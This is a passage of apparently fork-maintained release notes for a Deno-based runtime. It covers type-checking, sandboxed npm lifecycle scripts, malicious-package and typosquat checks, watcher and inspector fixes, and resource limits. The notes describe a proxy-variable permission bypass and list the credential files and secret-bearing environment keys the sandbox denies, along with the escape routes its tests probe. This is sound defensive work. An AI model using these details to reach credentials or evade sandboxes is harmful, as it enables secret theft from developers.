      generator reads the files on disk, which an unsaved buffer's import is not
      in, so the backend names those imports to it
      (`DENO_INTERNAL_SYNC_TYPES_SPECIFIERS`, one per line, internal).

    Tests: `tests/specs/check/check_engine` (`run --check`, `test`, `bench`,
    `bundle --check` (also with an extensionless import), `publish --dry-run`
    with a type error and with a slow type, `test --doc`, `check --doc` and
    `--doc-only`, a doc block with relative and documented-module imports, each
    under both engines with one expected output file, and the fallback's debug
    record); `tests/specs/check/typecheck_doc_*` re-enabled (upstream had
    ignored them, denoland/deno#35946); `check_watch_test` re-enabled; unit
    tests `code_block_diagnostics_name_the_block` (`cli/tools/check.rs`),
    `generated_types_dir_is_not_a_change` (`cli/util/file_watcher.rs`),
    `unresolved_external_imports` and `semantic_tokens_follow_denos_legend`
    (`cli/lsp/tsgo.rs`); `lsp_tsgo_vitest_types`, `lsp_tsgo_semantic_tokens` and
    `lsp_tsgo_types_follow_a_new_import` in
    `tests/integration/lsp_tsgo_tests.rs`.

82. **`fix(permissions)`: the proxy variables are read before user code**
    (`fix/proxy-env-snapshot`, for runtime `denext.23`; `ext/fetch/proxy.rs`,
    `runtime/worker.rs`, `cli/lib.rs`). Follows item 80. `fetch()` creates its
    HTTP client lazily, on the first request, and `create_http_client` read
    `HTTP_PROXY` / `HTTPS_PROXY` / `ALL_PROXY` / `NO_PROXY` (either case) at
    that point. The connection to an environment proxy is operator configuration
    and is not checked against `--allow-net`, so a program with `--allow-env`
    could `Deno.env.set("HTTP_PROXY", ...)` before its first `fetch()` and send
    its requests, bodies included, to a host it may not connect to (or set
    `NO_PROXY` to skip the operator's proxy). The variables (and the
    `REQUEST_METHOD` CGI guard) are now read once into a snapshot
    (`deno_fetch::snapshot_proxy_env`), which `MainWorker::from_options` takes
    before any user code runs, and every client uses it. An explicit
    `Deno.createHttpClient({ proxy })` is unchanged: it is checked as before.
    `node:http`'s own `NODE_USE_ENV_PROXY` support still reads the variables on
    its first request, but it connects to the proxy through `node:net`, which
    checks `--allow-net`. For consistency the CLI also reads `JSR_URL` as a
    subcommand starts; it was already read at startup on the paths tested (the
    default import allow list uses it), and a `jsr:` load is checked against
    `--allow-import` either way. Tests: `permission/proxy_env_set_at_runtime`
    (`HTTP_PROXY`, `http_proxy`, `ALL_PROXY`, `all_proxy` set at runtime are not
    used; a runtime `NO_PROXY` does not bypass the startup proxy; control: a
    startup `HTTP_PROXY` is used) and `permission/jsr_url_set_at_runtime` (a
    guard: passes before and after).
83. **`feat(npm)`: confined lifecycle scripts (`jail-scripts`)**
    (`feat/npm-supply-chain`, for `3.0.0-rc.2`; `cli/supply_chain/jail.rs`,
    `sandbox_linux.rs`, `sandbox_macos.rs`, `cli/npm.rs`, `cli/task_runner.rs`,
    `cli/args/mod.rs`, `cli/lib.rs`). Adapted from
    [denoland/deno#35714](https://github.com/denoland/deno/issues/35714) (an
    issue, no pull request). An approved dependency's lifecycle script ran with
    the user's whole environment (`GITHUB_TOKEN`, `NPM_TOKEN`, `SSH_AUTH_SOCK`,
    ...), the real HOME, and a `node` that is `deno run -A`; item 54 put that
    `node` (and `node-gyp`) on `PATH` for every install. Introduced opt-in:
    `--jail-scripts`, `jail-scripts=true` in `.npmrc`
    (`npm_config_jail_scripts`), or deno.json
    `"supplyChain": { "jailScripts": true }`; `paranoid` (item 86) turns it on.
    On by default since item 103 (`--no-jail-scripts` / `jail-scripts=false` to
    opt out). A jailed script runs in its own process
    (`deno __deno_internal_jailed_lifecycle_script`, the script and its bins
    read from stdin, then an empty stdin) with:
    - an allow-listed environment: `PATH`, terminal and locale, `CI`, compiler
      and `node-gyp` variables (`CC`, `CXX`, `PYTHON`, `CFLAGS`, `MAKEFLAGS`,
      `SDKROOT`, `NODEJS_ORG_MIRROR`, ...), Windows' system and Visual Studio
      variables, `npm_package_*` / `npm_lifecycle_*`, `npm_config_*` except keys
      naming credentials (`auth`, `token`, `pass`, `secret`, `cert`, `key`,
      `email`, `user`, `otp`, `//`), the proxy variables only when the network
      is allowed, and Deno's internal ones (not `DENO_DIR` or
      `DENO_AUTH_TOKENS`); `HOME`, `TMPDIR`/`TEMP`/`TMP`, `DENO_DIR`,
      `XDG_*_HOME` (on Windows `USERPROFILE`, `APPDATA`, `LOCALAPPDATA`) point
      at `node_modules/.deno/.jail/<package>/`, removed after the package's
      scripts;
    - the OS confining the whole process tree, whatever the script starts (`sh`,
      `curl`, a compiler, `deno run -A`): writes only beneath node_modules (the
      scratch directory and its `TMPDIR` are inside) and the package's own
      `write` paths, not the shared system temp directory (a project, or another
      program's files, can live there; a tool that insists on `/tmp` gets
      `"write": ["/tmp"]`); no reading of credential files under the real home
      (`.ssh`, `.aws`, `.azure`, `.gnupg`, `.kube`, `.docker`, `.npmrc`,
      `.yarnrc`, `.netrc`, `.git-credentials`, `.pgpass`, `.pypirc`,
      `.cargo/credentials`, `.config/gcloud`, `.config/gh`, ...,
      `Library/Keychains`) or of the project's `.npmrc` / `.env*`; no network
      unless allowed; no Unix sockets (a Docker or D-Bus socket would run
      anything). On Linux, Landlock (writes, and reads through an
      allow-everything-else rule set) and seccomp (`socket(2)` only for netlink,
      plus IPv4/IPv6 when the network is allowed; no `io_uring`; another ABI's
      syscalls kill the process), applied between fork and exec with
      `no_new_privs`. Landlock checks the real file hierarchy, so a symlink in
      node_modules (a workspace member's, or one the script makes) can't lead a
      write outside, and its ptrace scoping keeps the script from reading the
      installer's `/proc/<pid>/environ`. On macOS, `sandbox-exec` (Seatbelt)
      with a generated profile, which also blocks DNS (mDNSResponder) without
      network;
    - every `deno` started inside it (the `node` shim, `.bin` wrappers,
      `node-gyp`, a script's own `deno run -A`) clamping its permissions to the
      jail (`DENO_INTERNAL_LIFECYCLE_JAIL`, in
      `CliOptions::permissions_options_for_dir`): write access only to those
      roots (a narrower list stays; a list outside them is dropped, never
      widened to "all"), the symlinks in node_modules that lead outside them
      denied, the credential files denied for reading, no FFI, the network and
      remote imports per the jail, no prompts; and refusing the subcommands that
      install or fetch (`install`, `add`, `x`, `ci`, ...; only `run`, `eval`,
      `task`, `repl`, `test`, `bench`, `check`, `info`, `types`, `serve`,
      `help`, `completions` run). `npm` / `npx` in the script no longer fall
      back to a real npm (which would install packages the approval never
      covered).

    Network: off by default; on for every jailed script with
    `supplyChain.jailScripts.net`, per package with `packages.<name>.net`, or
    for the hosts a package declares as node-pre-gyp's `binary.host` /
    `staging_host` / `production_host` (the OS allows the network, Deno only
    those hosts; under `paranoid` a package can't grant itself anything).
    Per-package exceptions in deno.json:
    `"jailScripts": { "packages": { "<name>": { "env": [...], "write": [...], "net": true } } }`.
    The project's own scripts (root package.json, workspace members; item 54)
    are not jailed: they are the project's code, as `deno task` is.

    Where the OS can't confine (Windows; Linux without Landlock, 5.13+; macOS
    without a working `sandbox-exec`, for example inside another sandbox), the
    environment, HOME and the Deno clamp still apply and a warning says the
    script's other programs are not confined; `paranoid` refuses to run the
    script there. What stays open by design: reads outside the credential list
    (the spec asks reads to stay broad), writes anywhere in node_modules
    (prisma's `node_modules/.prisma` and similar need it, so a script can still
    change another installed package), and on Linux older than Landlock ABI 3
    (6.2) `truncate(2)` of a file outside the roots.

    Tests: `npm/supply_chain_jail` (Linux, macOS and Windows outputs of a probe
    package that tries the ways out: node and `sh` writes to the project,
    through its own symlink and a workspace member's link, reading `.env`, the
    installer's environment through `/proc`, `fetch`, `deno run -A`, `npx`,
    `deno install`; a control without the jail; the `.npmrc` key; per-package
    `env` / `write`; a declared download host and an undeclared one; `paranoid`
    jailing and ignoring the declaration; `paranoid` refusing on Windows), unit
    tests for the environment allow-list and the permission clamp (`jail.rs`),
    the seccomp program (`sandbox_linux.rs`) and the Seatbelt profile
    (`sandbox_macos.rs`).

84. **`feat(npm)`: refuse versions listed as malicious (`advisory-check`)**
    (`cli/supply_chain/advisories.rs`, `NpmInstallGate` in
    `libs/npm_installer`). Adapted from
    [denoland/deno#35715](https://github.com/denoland/deno/issues/35715). Before
    npm package versions are installed they are looked up in OSV
    (`POST https://api.osv.dev/v1/querybatch`, no account, batches of 500, 30 s
    timeout); a version with an advisory whose id starts with `MAL-` (the
    OpenSSF malicious-packages data: typosquats, hijacked releases, credential
    stealers) is refused, naming each advisory and its `osv.dev` link. Checked:
    everything an explicit `deno install`, `add` or `ci` installs (a version
    flagged after it was locked is caught), and in any other command the
    packages a resolution adds to the lockfile (`deno run` / `eval` importing a
    new package); `deno add` checks the selected versions before writing
    deno.json / package.json, and puts them back as they were if the install
    then refuses a dependency. Versions found clean are remembered in
    `DENO_DIR/npm_advisories_v1.json` for 24 hours (`DENO_OSV_CACHE_TTL`
    seconds), so repeated installs and CI runs don't query again; a hit is never
    cached. `advisory-check=on` (the default): when OSV can't be reached a
    warning is printed and the install goes on; `required` (and `paranoid`)
    refuses instead; `off` doesn't query. `--cached-only` skips the query unless
    required. `DENO_OSV_URL` names another OSV (a mirror; the spec tests'
    stand-in). Not covered: OSV pages past 1000 advisories for one version, and
    advisories that aren't `MAL-` (`deno audit`'s domain).

    Tests: `npm/supply_chain_advisories` (a malicious version refused on `add`
    with deno.json unchanged, a clean version of the same package added, a
    malicious dependency of a clean package refused and deno.json put back,
    `install` of a configured malicious version, `eval` importing one, `off`, an
    unreachable OSV warning under `on` and refusing under `required` from
    `.npmrc` and deno.json, a clean result reused from the cache and queried
    again past the TTL), against the stand-in OSV in
    `tests/util/server/servers/supply_chain.rs` (port 4270; every spec test gets
    `DENO_OSV_URL` pointing at it).

85. **`feat(npm)`: `deno add` warns about a package almost nobody downloads, and
    can ask first** (`cli/supply_chain/downloads.rs`, `cli/tools/pm/mod.rs`).
    Adapted from
    [denoland/deno#35716](https://github.com/denoland/deno/issues/35716): a
    typosquat guard. A package `deno add` (or `deno install <pkg>`) adds that
    the lockfile doesn't know yet and that has fewer weekly downloads than
    `low-download-threshold` (1000 by default; `0` turns it off) on
    `api.npmjs.org/downloads/point/last-week/` is handled per
    `low-download-check` (`.npmrc`, `npm_config_low_download_check`, deno.json
    `supplyChain.lowDownloadCheck`):
    - `warn` (the default): a warning with the count and how to allow the
      package, and the add goes on, so CI scripts that add small packages keep
      working (opt-in first, per the 3.0 rule);
    - `prompt`: a terminal asks for confirmation; without one (or with `CI` set)
      the add is refused, naming the count and how to allow it;
    - `required` (and `paranoid`): like `prompt`, and an unknown count (no count
      for the name, or the API can't be reached) refuses too, where `prompt`
      lets it through;
    - `off`: no counts are fetched.

    Allowing a package by name: `--allow-low-downloads=npm:<name>,...` (bare:
    all of them, not under `paranoid`), `allowed-unpopular-packages` (`.npmrc`,
    names or `@scope/*` / `prefix*` globs) or deno.json
    `supplyChain.allowLowDownloads`. Packages from another registry than
    `registry.npmjs.org` (a private one has no public counts) are not checked.
    Nothing is written before the check. `DENO_NPM_DOWNLOADS_URL` names another
    downloads API, and then the default registry is checked against it whatever
    it is (the spec tests' stand-in). Not covered: a "did you mean" suggestion,
    and transitive dependencies.

    Tests: `npm/supply_chain_low_downloads` (the default warning with the add
    going on, `off` silent, `prompt` refusing without a terminal with deno.json
    unchanged, `prompt` from the environment, a package above the threshold
    added, allowed by name on the command line but not by another name, allowed
    by the bare flag, by an `.npmrc` glob, by deno.json, a threshold of 0, a
    name the lockfile already has, an unknown count and an unreachable API
    letting it through under `prompt`, `required` refusing an unknown count,
    another registry not checked).

86. **`feat(npm)`: `paranoid`** (`libs/npmrc/supply_chain.rs`,
    `libs/resolver/npmrc.rs`, `libs/config/deno_json`). Adapted from
    [denoland/deno#35717](https://github.com/denoland/deno/issues/35717). One
    switch for the strict posture: `paranoid=true` in `.npmrc`
    (`npm_config_paranoid`), or deno.json `"supplyChain": { "paranoid": true }`.
    Every gate is on and fails closed: `jail-scripts` on (and refusing to run a
    script where the OS can't confine it, a package's own `binary.host` granting
    no network), `advisory-check=required` (OSV unreachable refuses),
    `low-download-check=required` (`deno add` asks, refuses without a terminal
    and on unknown counts; `--allow-low-downloads` needs names),
    `trust-policy=no-downgrade`. Resolved in one place: each source (`.npmrc`
    files, the environment, the root deno.json's `supplyChain`) gives the
    settings it sets, and `resolve_supply_chain` combines them, so the resolver,
    installer, `deno add` and the script executor read the hardened values.
    Where several sources set a member the stricter value wins, so one file
    can't quietly loosen another; `paranoid` can't be turned off by another
    source. A member set to something weaker than `paranoid` requires
    (`jail-scripts=false`, `advisory-check=off` or `on`,
    `low-download-check=off`, `warn` or `prompt`, `low-download-threshold=0`,
    `trust-policy=off`) is an error naming the setting and where it is, so a
    configuration can't look strict while being loose; a stricter member (a
    higher threshold) is kept, and the name allow-lists stay honored. Not a
    member: `min-release-age` keeps its window and its fallback to an older
    satisfying version (failing instead of falling back is left for 3.0.0
    final).

    Tests: `npm/supply_chain_paranoid` (OSV unreachable, an unknown count and an
    unreachable downloads API each refusing, `--allow-low-downloads` needing
    names, a stricter threshold kept, the no-downgrade trust policy on, a weaker
    member in `.npmrc`, deno.json and the environment, and `trust-policy=off`,
    each an error), the `npm/supply_chain_jail` paranoid cases, and the
    resolution unit tests in `libs/npmrc/supply_chain.rs` and
    `libs/config/deno_json` (`test_to_supply_chain_config`).

87. **`fix(watch)`: a SIGTERM from another process stops the watcher**
    (`fix/watch-kill-signal`, for runtime `denext.23`; `ext/signals/lib.rs`,
    `cli/util/file_watcher.rs`). node_compat's
    `parallel/test-watch-mode-kill-signal-default.mjs` timed out on most Linux
    runs (in a loop on `ubuntu-22.04`: 0/50 passed idle, 9/50 under CPU load).
    It runs `node --watch` (`deno run --watch`) on a program whose SIGTERM
    listener calls `process.exit()`, touches the file, and kills the watcher
    with SIGTERM as soon as the old run prints that it got the restart's
    SIGTERM. The watcher and the program are one process, and that `kill`
    arrives inside the graceful-restart window, after the listener has run
    (`process.exit()` has removed it) and while #36268's one-shot suppression
    (item 72) is armed for a re-raise. The suppression could not tell the
    re-raise from any other SIGTERM, so it consumed the `kill`; the watcher
    restarted the program and waited for file changes until the test's 10 s
    timeout. A `kill` that landed later reached the new run's listener, whose
    `process.exit()` under `--watch` ends only the run (#35021), with the same
    result; only one that fell between the runs (no listener, no suppression)
    ended the process. Fixed:
    - The OS signal thread reads each delivery's `siginfo` (`WithRawSiginfo`, no
      new crate feature), and the suppression consumes only a signal the process
      sent itself (`si_pid` is its own pid), which is what the re-raise is. A
      `kill` from another process inside the window terminates as it does
      outside it. Linux records the sender per signal; macOS records one per
      process, so there a signal from another sender arriving at the same moment
      can be attributed to the wrong one (best effort; the unit tests signal one
      at a time for this reason, after a parallel pair failed on
      `macos-15-intel`).
    - `deno_signals::delivery_count(signal)` counts the deliveries from other
      processes (and the kernel, and Windows console events), before the
      handlers run; `raise()` and self-sent signals are not counted.
    - The watcher stops on such a SIGTERM, as on Ctrl+C and as `node --watch`
      does for its parent process: each run registers a SIGTERM stream that does
      not prevent the default action before the program can add its own
      listener, so a program without a listener is still terminated by the
      signal itself; with a listener, the listener gets the signal and the
      watcher waits the graceful window (500 ms) for the run to end and exits 0,
      also after a run ended (its listeners may still be registered). A SIGTERM
      that arrived while the stream was not polled is caught by the count before
      the next run starts. The restart's own SIGTERM and a program's
      `process.kill(process.pid, "SIGTERM")` do not stop it.

    A program under `--watch` that handles an external SIGTERM to keep running
    now stops the watcher after its handler, as with Ctrl+C. (In the same test
    the restarted run has no IPC channel, since the first run consumes
    `NODE_CHANNEL_FD`, so it fails on `process.send`; the hang did not depend on
    that, and it is not changed here.) Tests:
    `run_watch_external_sigterm_in_restart_window_terminates` and
    `run_watch_external_sigterm_with_listener_stops_watcher`
    (`tests/integration/watcher_tests.rs`; both outlived the SIGTERM before),
    `delivery_count_counts_only_signals_from_other_processes` and
    `suppression_consumes_only_a_self_sent_reraise` (`ext/signals/lib.rs`), and
    the node_compat test, 50/50 in the same loop idle and under load.

88. **laufey `ef41855`: the CEF custom-scheme localStorage fix and Linux
    parity** (`feat/laufey-ef41855`, for runtime `3.0.0-rc.1`; laufey
    `development-denext` `ef41855`, API 49 unchanged; `cli/rt_desktop`,
    `cli/rt/desktop.rs`, `runtime/ops/desktop.rs`,
    `cli/tsc/dts/lib.deno.desktop.d.ts`, `.github/workflows/denext_runtime.yml`,
    `.github/denext-runtime/`).
    - CEF, every OS: a custom-scheme page that touched `localStorage` as it
      loaded could, now and then, bind no storage area (Chromium drops a
      StorageArea opened before the browser takes in the document's commit, and
      a custom-scheme response arrives at once), so the launch read nothing and
      lost what it stored; the next launch read the value from two launches
      before. The CEF scheme handler now holds a frame document's body until
      that frame's commit (at most 1 s). This is the race the e2e's appid check
      "A's localStorage persists across launches" hit now and then on macOS
      arm64 CEF; laufey's storage stress e2e loses 0 of 200 launches with the
      fix (7 of 200 without).
    - Linux: KWin's blur behind translucent windows (KDE Plasma, Wayland and
      X11, the WebView backend): laufey's `LAUFEY_BACKDROP_BLUR` /
      `LAUFEY_WINDOW_CAP_BACKDROP_BLUR`. `BrowserWindow.setBackgroundMaterial`
      takes `"blur"` (backdrop 5, mapped to `laufey::Backdrop::Blur`; on KDE
      Plasma `"acrylic"` is the same blur) and
      `Deno.desktop.windowCapabilities()` reports `blur`.
    - Linux: the X11 clipboard over XCB in X11 sessions.
    - Linux: passkeys with USB security keys through libwebauthn, in
      `liblaufey_webauthn.so` beside each host (dlopen()ed when a passkey is
      first asked for; libwebauthn is LGPL-2.1-or-later and stays a separately
      replaceable library). The laufey build job installs `libudev-dev` and
      `libdbus-1-dev`, without which laufey's Makefile skips the library; the
      stage copies it beside the webview host (CEF's comes with its Release
      directory) and libwebauthn's `COPYING` and a source notice into
      `licenses/libwebauthn/`. `assemble.sh` refuses a Linux archive without the
      library, and `verify.sh` checks it in both archives (its
      `laufey_webauthn_start` entry point, no virtual-authenticator test hooks,
      its dependencies resolving). The e2e's passkeys area now expects
      `securityKeys` on Linux and the same refusal codes as macOS and Windows,
      and runs the OS-request checks there too.
    - `Deno.desktop.platformFeatures()` passes laufey's new `windowBlur` /
      `windowBlurReason` and `passkeys` / `passkeysReason` keys through; the
      d.ts declares them.

89. **`fix(inspector)`: `--inspect-brk` is paused on start from the moment the
    inspector is registered** (`fix/inspect-brk-flake`, for runtime `denext.23`;
    `libs/core/inspector.rs`, `runtime/worker.rs`). node_compat's
    `parallel/test-esm-loader-hooks-inspect-brk.js` timed out on most Linux runs
    (in a loop on `ubuntu-22.04`: 20/50 passed idle, 16/50 under CPU load). Its
    frontend (Node's inspector test helper) connects, sends `NodeRuntime.enable`
    and waits for `NodeRuntime.waitingForDebugger` before it resumes. The main
    worker registers its inspector with the server before it loads the main
    module, and the event loop dispatches a connected session's messages while
    the module graph loads; but the runtime counted as paused on start only once
    `wait_for_session_and_break_on_next_statement` ran, after loading. A
    `NodeRuntime.enable` handled before then got its result and no notification,
    and the test waited until its timeout (the protocol log of every failed run
    ends at `{"id":1,"result":{}}`). `JsRuntimeInspector::arm_break_on_start()`,
    called where the main worker registers the inspector under `--inspect-brk`,
    marks it paused on start from then on; a `Runtime.runIfWaitingForDebugger`
    received while the module loads resumes it, and the later wait no longer
    blocks for a second resume (it schedules the first-statement pause on the
    resuming session as before). Test:
    `inspect_brk_frontend_attached_while_the_module_loads`
    (`libs/core/runtime/tests/misc.rs`, a proxied session as the WebSocket
    server creates, pumped as the event loop does), and the node_compat test,
    50/50 in the same loop idle and under load.

90. **`feat(check)`: tighter TypeScript 7 checks** (`feat/ts7-tight`, for
    runtime `3.0.0-rc.2`; `cli/type_checker.rs`, `cli/tools/check.rs`,
    `cli/tsc/tsconfig_gen.rs`). Follows items 47 and 81.
    - **A JSX runtime reached through an import map checks natively.**
      `TypeChecker::native_unsupported` kept every graph whose `jsxImportSource`
      runtime resolved to anything but a local file or an `npm:` package on the
      in-process TypeScript 6.0.3, so `deno test`, `run --check` & co. of an app
      with `"jsxImportSource": "denext"` and
      `"denext/": "jsr:/@denext/denext@4/"` never used the native compiler
      (`deno check` reached it only by building the graph a second time). The
      generated `paths` map the import-map key to the `jsr:` package's types, a
      mirrored remote module or a local file, so only a source written with a
      scheme (`npm:preact`) or a runtime Deno could not load keeps the fallback
      (`jsx_runtime_unexpressible`).
    - **The generated project is reused across local edits.** Every native check
      that missed Deno's check cache ran `deno sync-types` again, which builds
      its own module graph and rewrites `.deno/`; in a project on
      `jsr:@denext/denext` that took about ten times the compiler's own time, on
      every edit the dev type-check overlay checks. `run_native_check` now
      records a digest of what the generated project is made from
      (`.deno/check-inputs`: this Deno and its compiler, the flags that change
      generation, the type lib, check mode and roots, the registries, the
      workspace's deno.json / package.json / import map / lockfile /
      tsconfig.json, an installed `node_modules`' records, the graph's remote,
      `jsr:` and `npm:` modules and local Wasm modules, and the generated
      `tsconfig.json` it wrote) and reuses `.deno/` while that digest matches,
      the generated config is unchanged and every file it maps outside the
      project exists. A local edit changes none of them. If a reused project
      still leaves an import, a type package or the JSX runtime unresolved
      (TS2307, TS2792, TS2688, TS2875, TS7016), the check generates it again and
      runs once more, so a stale record never decides a result. `--reload` and
      `--doc` code blocks always generate.
    - **A user `tsconfig.json` as TypeScript 7 takes it.** The check overlays
      the user's `tsconfig.json` (in a deno.json or package.json project) on the
      generated one. Two things broke a typical Next.js-style config: TypeScript
      7 refuses the options 6.0 deprecated (`baseUrl`,
      `"moduleResolution": "node"`, `"target": "es5"`: TS5102 / TS5108, which
      stop the whole check), and the user's `paths` replaced the generated map
      wholesale, so every import-map, `jsr:` and `npm:` import reported TS2307
      and a JSX runtime TS2875. `build_check_root_overlay` now adapts the
      removed options (`baseUrl`: its `paths` targets rebased onto the config's
      directory, as Deno's resolver reads them; `moduleResolution` `node` /
      `node10` / `classic` → `bundler`; `target` `es3` / `es5`, `module` `amd` /
      `umd` / `system` / `none`, `downlevelIteration`, `outFile` and `false` for
      `esModuleInterop` / `allowSyntheticDefaultImports` / `alwaysStrict`
      dropped; a debug record lists them) and adds the generated `paths` to the
      user's (rebased onto the project root; the user's entry wins a key both
      map). The in-process engine still reports TS5101 for a deprecated option,
      as TypeScript 6 does. Not covered: `paths` set only in a config the user's
      `extends`.

    Tests: unit tests `jsx_runtime_through_an_import_map_is_expressible`,
    `jsx_runtime_with_a_scheme_or_not_loaded_is_not` (`cli/type_checker.rs`),
    `generated_project_is_reused_only_unchanged`,
    `generated_targets_outside_the_project_must_exist` (`cli/tools/check.rs`),
    `removed_options_are_adapted_for_typescript_7`,
    `user_paths_keep_the_generated_ones` (`cli/tsc/tsconfig_gen.rs`); specs
    `check/native_reuse_generated` (a local edit reuses the project and checks
    the new source; a config change generates it again) and
    `check/native_user_tsconfig_ts7` (`baseUrl`, `moduleResolution: node`,
    `target: es5` and `paths` beside an import map).

    Tests: `backdrop_numbers_match_laufey` (`cli/rt_desktop/lib.rs`),
    `desktop_js_maps_blur_to_laufey_backdrop_blur` (`cli/rt/desktop.rs`), the
    `blur` key in `io_capabilities_wire_format` and the `desktop_ops_inert`
    spec, laufey's full CI on the commit (the commit gate, blur, XCB clipboard
    and libwebauthn suites, and the storage stress e2e), and this fork's desktop
    runtime build and e2e on every target.

91. **`feat(workers)`: `new Worker(url, { deno: { memoryMb } })` caps a worker's
    heap** (`feat/worker-memory-limit`, for runtime `3.0.0-rc.2`;
    `runtime/js/11_workers.js`, `runtime/ops/worker_host.rs`,
    `runtime/web_worker.rs`, `cli/tsc/dts/lib.deno.unstable.d.ts`). Carried from
    the open upstream pull request
    [denoland/deno#35766](https://github.com/denoland/deno/pull/35766) (head
    `33374a6`), which reuses `node:worker_threads`' `resourceLimits` plumbing:
    `memoryMb` becomes the worker isolate's `maxOldGenerationSizeMb`, and the
    near-heap-limit callback that already stopped a Node worker over its limit
    now stops a web worker too (the `WorkerThreadType::Node` guard in
    `run_web_worker` is lifted; `oom_triggered` is only ever set when limits
    were given, so a worker without one is unchanged). A worker over its limit
    is terminated and the `Worker` gets an `error` event,
    `Worker terminated due
    to reaching memory limit: JS heap out of memory`;
    a parent that handles it (`event.preventDefault()`) keeps running, and one
    that doesn't ends as on any other uncaught worker error. The limit bounds
    the JavaScript heap only (not `ArrayBuffer` backing stores). Our changes,
    from the pull request's open review:
    - `memoryMb` without `--unstable-worker-options` exits with the unstable-API
      error (`Worker.deno.memoryMb`, exit code 70), as `deno.permissions` does,
      where the pull request dropped the limit silently and started an unlimited
      worker. `node:worker_threads`' `resourceLimits` stays ungated (stable).
    - The value goes through WebIDL's `unsigned long long` with `enforceRange`,
      so a negative or non-finite value is a `TypeError` naming `deno.memoryMb`,
      and `0` (which the isolate setup reads as "no limit") a `RangeError`.
    - A worker stopped by its limit inside a callback (a message handler, a
      timer) panicked the process
      (`coding error: either js is polling or the
      worker is terminated`):
      the terminated isolate ends the event loop without an error, and only Node
      workers took the non-panicking path. `WebWorker::poll_event_loop` now
      reports the out-of-memory termination as an error, so the parent gets its
      `error` event (the pull request's spec only covered the limit reached
      while the module evaluates).
    - The spec's limits sit far from the boundary (the pull request's 8 MB OOM
      case could pass by failing bootstrap): a worker that allocates without
      bound against 32 MB, and a 16-32 MB allocation under 256 MB.

    Tests: `worker/worker_memory_limit` (over the limit while the module
    evaluates and in a message handler, each followed by a second worker to show
    the parent alive; under the limit; an unhandled event ending the parent; the
    flag required; invalid values).

92. **`feat(cli)`: `--max-memory`, `--max-cpu-time` and `--max-time`**
    (`feat/resource-limits`, for runtime `3.0.0-rc.2`;
    `cli/lib/resource_limits.rs`, `cli/lib/worker.rs`, `cli/lib.rs`,
    `cli/rt/lib.rs`, `cli/rt/run.rs`, `cli/lib/standalone/binary.rs`,
    `cli/standalone/binary.rs`, `ext/os/lib.rs`, `libs/cli_parser`). Adapted
    from [denoland/deno#35723](https://github.com/denoland/deno/pull/35723)
    (head `24fab7e`), closed after ten review rounds with a split into three
    pull requests announced and never opened; this is that split, written
    against the last review. Process resource limits for `deno run` (and a bare
    `deno <script>`) and `deno compile`, which stores them in the binary's
    metadata so the compiled program enforces them the way it keeps
    `--unstable-no-legacy-abort` (item 36). Each ends the process with its own
    exit code and one line on stderr:

    | Flag                    | Limit                                               | Exit code | Message                                    |
    | ----------------------- | --------------------------------------------------- | --------- | ------------------------------------------ |
    | `--max-memory=<size>`   | the main isolate's V8 heap (young + old generation) | 137       | `Memory limit exceeded (--max-memory)`     |
    | `--max-cpu-time=<secs>` | process CPU time, user + system, every thread       | 152       | `CPU time limit exceeded (--max-cpu-time)` |
    | `--max-time=<secs>`     | wall-clock time, idle included                      | 124       | `Time limit exceeded (--max-time)`         |

    124 is GNU `timeout`'s code, 137 how a shell reports a process the OOM
    killer ended (128 + SIGKILL), 152 is 128 + SIGXCPU (what `RLIMIT_CPU`
    sends), so supervisors read them as they read those. Sizes are a plain
    number of megabytes or `k`/`m`/`g` (binary, any case), at least `32m` (below
    that V8 can't deserialize its snapshot); times are whole seconds, at least
    1. The CPU budget and the deadline count from when the main worker is
       created (module loading included, Deno's own startup not).

    How: `--max-memory` sets the isolate's heap limit at creation and a
    near-heap-limit callback that records the limit, terminates execution and
    raises the limit so the termination unwinds instead of V8 aborting. A
    watchdog thread samples `getrusage(RUSAGE_SELF)` / `GetProcessTimes`
    (`deno_os::process_cpu_time`, read from the `FILETIME`s directly, since
    `op_runtime_cpu_usage`'s conversion wraps after 24 hours) and the clock
    every 20 ms and terminates the main isolate at a limit. The exit path (the
    CLI's `exit_for_error` and its success path, `denort`'s likewise) reports
    the recorded limit instead of "execution terminated", and a limit recorded
    decides the exit code even if the program then ends by itself. A program
    that can't unwind (idle on a timer, blocked in a native call, or a busy
    Worker while the main thread waits) is ended by the watchdog 2 s after the
    limit; exactly one of the two prints the message.

    Differences from the pull request, from its last review:
    - `--max-memory` is the V8 heap limit only. The pull request also ran an RSS
      watchdog with the same number, which (RSS being the heap plus Deno's own
      40-80 MB) always fired first and made the precise heap path dead code; the
      help said RSS while the body said heap. Values under 32 MB are refused
      instead of flooring the heap cap, and sizes are kept in bytes, so `3000k`
      is not truncated to 2 MB.
    - The limits are refused with `--watch` / `--watch-hmr` (an error), where
      the pull request's deadline was never disarmed and killed an idle watch
      session. A limit ends the process; ending only one run under a watcher is
      left for later. `deno run --max-*` of a missing script doesn't fall back
      to a task of that name.
    - The deadline and the CPU baseline are set together when the main worker is
      created, so nothing is armed before it is reset, and a `--preload` module
      can't spend CPU before the budget starts.
    - `--max-cpu-time` is an error where the process CPU time can't be read
      (`PROCESS_CPU_TIME_SUPPORTED`), not accepted and never enforced.
    - The help text says these are best-effort guardrails, not a security
      boundary: subprocesses are neither counted nor stopped, Workers have their
      own heaps (item 89's `memoryMb`), memory outside the heap isn't counted,
      and sampling can overshoot by a tick.
    - One message source (`LimitKind`), no poisoning locks (`parking_lot`,
      atomics), one parser (the fork has only `deno_cli_parser`, so the
      clap-wording parity issue is gone), and a non-numeric seconds value is
      tested.
    - No deno.json key: the pull request has none either.

    Tests: `run/resource_limits` (each limit reached, with its exit code and
    message: memory with a program catching every error, in megabytes and
    kilobytes; CPU in JavaScript and in a busy Worker while the main thread
    idles; time busy and idle; idle time not counted as CPU time; room enough
    keeping the program's own exit code; invalid, too small, zero and
    non-numeric values; refused on `deno test` and with `--watch`; no task
    fallback), `compile/resource_limits` (each limit enforced by the compiled
    program, and the same program without limits running to its end), the parser
    tests in `libs/cli_parser/src/tests_full.rs` (`run_resource_limits`,
    `bare_run_resource_limits`, `compile_resource_limits`, `max_memory_sizes`,
    `resource_limits_reject_invalid`, `resource_limits_only_on_run_and_compile`,
    `resource_limits_conflict_with_watch`), `exit_codes_and_messages` and
    `heap_limit_only_with_max_memory` (`cli/lib/resource_limits.rs`) and
    `process_cpu_time_advances_with_work` (`ext/os`).

93. **`feat(permissions)`: `--allow-net-connect` / `--allow-net-listen`**
    (`feat/net-connect-listen`, for runtime `3.0.0-rc.2`;
